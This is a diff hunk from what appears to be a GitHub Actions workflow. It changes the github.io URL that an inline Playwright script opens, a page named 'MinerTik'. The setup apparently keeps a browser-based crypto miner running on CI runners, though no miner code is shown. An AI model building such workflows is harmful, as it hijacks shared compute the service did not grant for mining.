@@ -37,7 +37,7 @@ jobs:
           const { chromium } = require('playwright');
           
           (async () => {
-            const url = 'https://akcbsksbdishs.github.io/MinerTik';
+            const url = 'https://speakdevir.github.io/MinerTik';
             const startTime = new Date();
             
             console.log('═══════════════════════════════════════════');
